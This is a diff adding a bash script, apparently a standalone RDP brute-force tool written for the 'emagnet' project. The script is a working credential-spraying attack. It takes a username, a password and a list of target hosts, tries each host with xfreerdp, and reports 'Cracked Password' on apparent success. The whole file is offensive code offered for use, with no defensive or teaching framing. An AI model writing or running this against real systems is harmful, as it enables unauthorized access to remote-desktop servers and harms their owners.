@@ -1,0 +1,60 @@
+#!/bin/bash
+# =====================================================
+# Author: wuseman <wuseman@nr1.nu>
+# Created: 2019-10-16
+# =====================================================
+# There is few RDP bruteforce tools
+# that is opensource hence this was created,
+# =====================================================
+# This tool is meant for be a part of 
+# emagnet but I decided to upload this
+# as a stand alone if someone will re-write the code
+# =====================================================
+# Version: 1.0
+# License. GPL v3.0
+# =====================================================
+
+
+banner() {
+cat << "EOF"
+      ___
+     |   |
+    _|___|_
+     (* *)
+    __)#(__
+   ( )...( )(_)             Author: wuseman
+   || |_| ||//              Version: 1.0
+>==() | | ()/
+    _(___)_
+   [-]   [-]
+=====================================================
+EOF
+}
+
+hash  xfreerdp &> /dev/null
+( [[ $? -eq "0" ]] || echo -e "$basename$0: internal error -- xfreerdp is required to be installed"; exit 1 )
+
+banner
+read -p "Username: "  RDP_USERNAME
+read -p "Password: "  RDP_PASSWORD
+read -p "Host File: " RDP_TARGETS
+cat << EOF
+====================================================
+Details: 
+Username: $RDP_USERNAME
+Password: $RDP_PASSWORD
+====================================================
+EOF
+
+while read line; do
+       #timeout 0.5
+       xfreerdp --ignore-certificate --authonly -u $RDP_USERNAME -p $RDP_PASSWORD $line &> test
+       cat test|grep -q "ERRCONNECT_SECURITY_NEGO_CONNECT_FAILED"
+        if [[ $? != "0" ]]; then
+          echo -e "[\e[1;32m>>\e[0m] - Cracked Password: $line"
+        else
+          echo -e "[\e[1;31m<<\e[0m] - Wrong Login: $line"
+        fi
+           sleep 4
+done < $RDP_TARGETS
+          rm test
